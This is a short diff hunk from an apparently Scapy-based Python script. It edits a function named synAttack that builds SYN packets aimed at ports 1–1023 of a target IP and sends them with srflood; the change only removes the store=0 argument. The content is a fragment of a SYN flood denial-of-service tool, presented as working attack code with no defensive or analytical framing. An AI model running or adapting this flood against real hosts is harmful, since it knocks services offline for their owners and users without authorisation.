@@ -18,7 +18,7 @@ def synAttack(targetip):
 	P_IP = IP(src=srcip, dst=targetip)
 	P_TCP = TCP(dport=range(1,1024), flags='S')
 	packet = P_IP/P_TCP
-	srflood(packet, store=0)
+	srflood(packet)
 	
 
 def main():
